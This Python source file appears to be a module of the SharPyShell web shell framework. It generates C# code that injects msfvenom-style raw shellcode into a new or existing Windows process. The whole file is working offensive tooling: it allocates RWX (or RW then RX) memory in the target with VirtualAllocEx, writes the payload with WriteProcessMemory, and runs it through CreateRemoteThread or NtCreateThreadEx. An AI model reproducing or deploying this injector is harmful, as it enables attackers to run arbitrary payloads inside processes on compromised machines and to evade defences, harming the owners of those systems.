from core.Module import Module, ModuleException
from utils import gzip_utils


class InjectShellcodeModuleException(ModuleException):
    pass


class Inject_shellcode(Module):
    _exception_class = InjectShellcodeModuleException
    short_help = "Inject shellcode in a new (or existing) process"
    complete_help = r"""
        This module allow to inject your shellcode in a host process.
        You can choose to create a new process or use a pid of an existing process as a host process.
        If you create the payload for the shellcode from msfvenom ensure you use the flag --format raw.
        You can use one of the following supported injection techniques:
            
            - remote_virtual:           classic injection:
                                        VirtualAllocEx (RWX) -> WriteProcessMemory -> CreateRemoteThread
            - remote_virtual_protect:   with this technique you never allocate RWX memory (polymorphic encoders won't work):
                                        VirtualAllocEx(RW) -> WriteProcessMemory -> VirtualProtect(RX) -> CreateRemoteThread
        
        Note that when you try to inject into an existing process you should ensure you have the rights to open
        a handle to that process otherwise the injection cannot be performed.
        
        Usage:
            #inject_shellcode shellcode_path [injection_type] [remote_process]
        
        Positional arguments:
            shellcode_path              path to a file containing shellcode in raw format (msfvenom --format raw)
            injection_type              the process injection method to use for injecting shellcode
                                        Allowed values: 'remote_virtual', 'remote_virtual_protect'
                                        Default: 'remote_virtual'
            remote_process              path to an executable to spawn as a host process for the DLL code
                                        if you pass a pid it will try to inject into an existing running process
                                        Default: 'cmd.exe'

        Examples:
            Inject generated shellcode:
                #inject_shellcode /path/to/shellcode
            Inject shellcode with specific injection type:
                #inject_shellcode /path/to/shellcode 'remote_virtual_protect'
            Inject shellcode into an existing process
                #inject_shellcode /path/to/shellcode 'remote_virtual' '1550'
                                                
    """

    _runtime_code = r"""
                    using System;using System.IO;using System.Diagnostics;using System.Text;
                    using System.Runtime.InteropServices; using System.IO.Compression;

                    public class SharPyShell
                    {
                        [DllImport("kernel32.dll", SetLastError = true)]
                        static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

                        [DllImport("kernel32.dll", SetLastError = true)]
                        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

                        [DllImport("kernel32.dll", SetLastError = true)]
                        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
                        
                        [DllImport("kernel32.dll", SetLastError = true)]
                        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

                        [DllImport("kernel32.dll", SetLastError = true)]
                        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
                        
                        [DllImport("kernel32.dll", SetLastError=true)]
                        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
                        
                        [DllImport("kernel32.dll", SetLastError = true)]
                        static extern bool CloseHandle(IntPtr hObject);
                        
                        [DllImport("ntdll.dll", SetLastError = true)]
                        static extern UInt32 NtCreateThreadEx(ref IntPtr hThread,UInt32 DesiredAccess,IntPtr ObjectAttributes,IntPtr ProcessHandle,IntPtr StartAddress,IntPtr lParam,bool CreateSuspended,UInt32 StackZeroBits,UInt32 SizeOfStackCommit,UInt32 SizeOfStackReserve,IntPtr BytesBuffer);

                        const uint PAGE_ALIGN = 1024;
                        
                        const int PROCESS_CREATE_THREAD = 0x0002;
                        const int PROCESS_QUERY_INFORMATION = 0x0400;
                        const int PROCESS_VM_OPERATION = 0x0008;
                        const int PROCESS_VM_WRITE = 0x0020;
                        const int PROCESS_VM_READ = 0x0010;

                        const uint MEM_COMMIT = 0x00001000;
                        const uint MEM_RESERVE = 0x00002000;
                        const uint PAGE_READWRITE = 0x04;
                        const uint PAGE_EXECUTE_READ = 0x20;
                        const uint PAGE_EXECUTE_READWRITE = 0x40;

                        const uint WAIT_OBJECT_0 = 0x00000000;

                        public string InjectShellcode(byte[] byteArrayCode, byte[] threadParameters, string process, uint threadTimeout, ulong offset)
                        {
                            string output = "";
                            string error_string = "\n\n\t{{{SharPyShellError}}}";
                            int processId=0;
                            Process targetProcess = new Process();
                            IntPtr targetProcessHandle = IntPtr.Zero;
                            IntPtr injectedThreadHandle = IntPtr.Zero;
                            bool usingExistingProcess = false;
                            try
                            {
                                if(!Int32.TryParse(process, out processId)){
                                    targetProcess = Process.Start(process);
                                    processId = targetProcess.Id;
                                    output += "\n\n\tStarted process " + process + " with pid " + processId.ToString();
                                }
                                else{
                                    targetProcess = Process.GetProcessById(processId);
                                    usingExistingProcess = true;
                                    output += "\n\n\tTrying to open running process with pid " + processId.ToString();
                                }
                                string processName = targetProcess.ProcessName;
                                string targetProcessPid = processId.ToString();
                                targetProcessHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, processId);
                                if(targetProcessHandle == (IntPtr)0){
                                    output += error_string + "\n\tOpenProcess on pid " + targetProcessPid + " failed with error code " + Marshal.GetLastWin32Error();
                                    return output;
                                }
                                output += "\n\n\tCorreclty opened a handle on process with pid " + targetProcessPid;
                                
                                uint codeMemorySize = (uint)(byteArrayCode.Length * Marshal.SizeOf(typeof(byte)) + 1);
                                if(codeMemorySize %% PAGE_ALIGN != 0)
                                    codeMemorySize += PAGE_ALIGN - ((uint)(byteArrayCode.Length+1) %% PAGE_ALIGN);
                                %s

                                codeMemAddress = (IntPtr)((ulong)codeMemAddress + (ulong)offset);
                                if(threadParameters.Length > 0){
                                    output += "\n\n\tThread parameters detected. Starting to allocate memory RW ...";
                                    uint threadParametersSize = (uint)(threadParameters.Length * Marshal.SizeOf(typeof(byte)) + 1);
                                    IntPtr threadParametersMemAddress = VirtualAllocEx(targetProcessHandle, IntPtr.Zero, threadParametersSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                                    if(threadParametersMemAddress == (IntPtr)0){
                                        output += error_string + "\n\tError allocating thread parameters buffer memory.\n\tVirtualAllocEx failed with error code " + Marshal.GetLastWin32Error();
                                        return output;
                                    }
                                    uint bytesWrittenThreadParams;
                                    output += "\n\n\tAllocated memory RW for thread parameters of " + threadParametersSize.ToString() + " bytes";
                                    if(!WriteProcessMemory(targetProcessHandle, threadParametersMemAddress, threadParameters, threadParametersSize, out bytesWrittenThreadParams)){
                                        output += error_string + "\n\tError writing code buffer in memory.\n\tWriteProcessMemory failed with error code " + Marshal.GetLastWin32Error();
                                        return output;
                                    }
                                    output += "\n\n\tThread parameters written into remote process. Bytes written: " + bytesWrittenThreadParams.ToString();
                                    if(Environment.OSVersion.Version  < new Version(6, 2) && usingExistingProcess){
                                        output += "\n\n\tDetected windows version < 6.2 and injection across sessions. Using NtCreateThreadEx...";
                                        NtCreateThreadEx(ref injectedThreadHandle, 0x1FFFFF, IntPtr.Zero, targetProcessHandle, codeMemAddress, threadParametersMemAddress, false, 0, 0, 0, IntPtr.Zero);
                                    }
                                    else{
                                        output += "\n\n\tUsing CreateRemoteThread...";
                                        injectedThreadHandle = CreateRemoteThread(targetProcessHandle, IntPtr.Zero, 0, codeMemAddress, threadParametersMemAddress, 0, IntPtr.Zero);
                                    }
                                }
                                else{
                                    if(Environment.OSVersion.Version  < new Version(6, 2) && usingExistingProcess){
                                        output += "\n\n\tDetected windows version < 6.2 and injection across sessions. Using NtCreateThreadEx...";
                                        NtCreateThreadEx(ref injectedThreadHandle, 0x1FFFFF, IntPtr.Zero, targetProcessHandle, codeMemAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
                                    }
                                    else{
                                        output += "\n\n\tUsing CreateRemoteThread...";
                                        injectedThreadHandle = CreateRemoteThread(targetProcessHandle, IntPtr.Zero, 0, codeMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
                                    }
                                }
                                if(injectedThreadHandle == (IntPtr)0){
                                    output += error_string + "\n\tError creating remote thread into target process.\n\tRemote Thread creation failed with error code " + Marshal.GetLastWin32Error();
                                    return output;
                                }
                                output += "\n\n\tRemote Thread started!";
                                if(threadTimeout>0){
                                    uint wait_for = WaitForSingleObject(injectedThreadHandle, threadTimeout);
                                    if(wait_for == WAIT_OBJECT_0){
                                        output += "\n\n\tCode executed and exited correctly";
                                        try{
                                            Process.GetProcessById(processId);
                                            targetProcess.Kill();
                                            output += "\n\n\tProcess " + processName + " with pid " + targetProcessPid + " has been killed";
                                        }
                                        catch{
                                            output += "\n\n\tProcess " + processName + " with pid " + targetProcessPid + " has exited";
                                        }
                                    }
                                    else{
                                        output += "\n\n\tRemote Thread Timed Out";
                                    }
                                }
                                else{
                                    output += "\n\n\tCode executed left in background as an async thread in the process '" + processName + ".exe' with pid " + targetProcessPid; 
                                }
                            }
                            catch (Exception ex)
                            {
                                output += error_string + "\n\tException occurred. " + ex.Message;
                                return output;
                            }
                            finally{
                                if((int)injectedThreadHandle > 0)
                                    CloseHandle(injectedThreadHandle);
                                if((int)targetProcessHandle > 0)
                                    CloseHandle(targetProcessHandle);
                            }
                            return output + "\n\n";
                        }
                        
                        private byte[] Decompress(byte[] data)
                        {
                            using (MemoryStream compressedStream = new MemoryStream(data))
                            using (GZipStream zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
                            using (MemoryStream resultStream = new MemoryStream())
                            {
                                byte[] buffer = new byte[16*1024];
                                int read;
                                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                                {
                                    resultStream.Write(buffer, 0, read);
                                }
                                return resultStream.ToArray();
                            }
                        }

                        public byte[] ExecRuntime()
                        {
                            string shellcodeBase64 = "%s";
                            byte[] shellcodeCompressed = Convert.FromBase64String(shellcodeBase64);
                            byte[] shellcodeByteArr = Decompress(shellcodeCompressed);
                            byte[] threadParameters = %s;
                            string output_func=InjectShellcode(shellcodeByteArr, threadParameters, @"%s", %s, %s);
                            byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                            return(output_func_byte);
                        }
                    }   
                    """

    _runtime_code_virtual = r"""
                    IntPtr codeMemAddress = VirtualAllocEx(targetProcessHandle, IntPtr.Zero, codeMemorySize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if(codeMemAddress == (IntPtr)0){
                        output += error_string + "\n\tError allocating code buffer memory.\n\tVirtualAllocEx failed with error code " + Marshal.GetLastWin32Error(); 
                        return output;
                    }
                    uint bytesWrittenCode;
                    output += "\n\n\tAllocated memory RWX for code of " + codeMemorySize.ToString() + " bytes";
                    if(!WriteProcessMemory(targetProcessHandle, codeMemAddress, byteArrayCode, codeMemorySize, out bytesWrittenCode)){
                        output += error_string + "\n\tError writing code buffer in memory.\n\tWriteProcessMemory failed with error code " + Marshal.GetLastWin32Error();
                        return output;
                    }
                    output += "\n\n\tCode written into remote process. Bytes written: " + bytesWrittenCode.ToString();
    """

    _runtime_code_virtual_protect = r"""
                    uint codeMemSize = codeMemorySize;
                    IntPtr codeMemAddress = VirtualAllocEx(targetProcessHandle, IntPtr.Zero, codeMemorySize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    if(codeMemAddress == (IntPtr)0){
                        output += error_string + "\n\tError allocating code buffer memory.\n\tVirtualAllocEx failed with error code " + Marshal.GetLastWin32Error();
                        return output;
                    }
                    uint bytesWrittenCode;
                    output += "\n\n\tAllocated memory RW for code of " + codeMemorySize.ToString() + " bytes";
                    if(!WriteProcessMemory(targetProcessHandle, codeMemAddress, byteArrayCode, codeMemorySize, out bytesWrittenCode)){
                        output += error_string + "\n\tError writing code buffer in memory.\n\tWriteProcessMemory failed with error code " + Marshal.GetLastWin32Error();
                        return output;
                    }
                    output += "\n\n\tCode written into remote process. Bytes written: " + bytesWrittenCode.ToString();
                    uint lpflOldProtect;
                    if(!VirtualProtectEx(targetProcessHandle, codeMemAddress, codeMemSize, PAGE_EXECUTE_READ, out lpflOldProtect)){
                        output += error_string + "\n\tError in changing memory from RW to RX.\n\tVirtualProtectEx failed with error code " + Marshal.GetLastWin32Error();
                        return output;
                    }
                    output += "\n\n\tChanged allocated memory for code from RW to RX";
                """

    _default_injection_type = 'remote_virtual'
    _default_remote_process = 'cmd.exe'
    _default_thread_timeout = '0'
    _default_thread_parameters = '{}'
    _default_code_offset = '0'

    def _parse_run_args(self, args):
        if len(args) < 1:
            raise self._exception_class('#inject_shellcode: Not enough arguments. 1 Argument required.\n')
        args_parser = {k: v for k, v in enumerate(args)}
        shellcode_path = args_parser.get(0)
        injection_type = args_parser.get(1, self._default_injection_type)
        remote_process = args_parser.get(2, self._default_remote_process)
        thread_timeout = args_parser.get(3, self._default_thread_timeout)
        thread_parameters = args_parser.get(4, self._default_thread_parameters)
        code_offset = args_parser.get(5, self._default_code_offset)
        return shellcode_path, injection_type, remote_process, thread_timeout, thread_parameters, code_offset

    def _create_request(self, args):
        shellcode_path, injection_type, remote_process,\
            thread_timeout, thread_parameters, code_offset = self._parse_run_args(args)
        base64_compressed_shellcode = gzip_utils.get_compressed_base64_from_file(shellcode_path)
        if injection_type == 'remote_virtual_protect':
            runtime_code = self._runtime_code % (self._runtime_code_virtual_protect, base64_compressed_shellcode,
                                                 thread_parameters, remote_process,
                                                 thread_timeout, code_offset)
        else:
            runtime_code = self._runtime_code % (self._runtime_code_virtual, base64_compressed_shellcode,
                                                 thread_parameters, remote_process,
                                                 thread_timeout, code_offset)
        return runtime_code
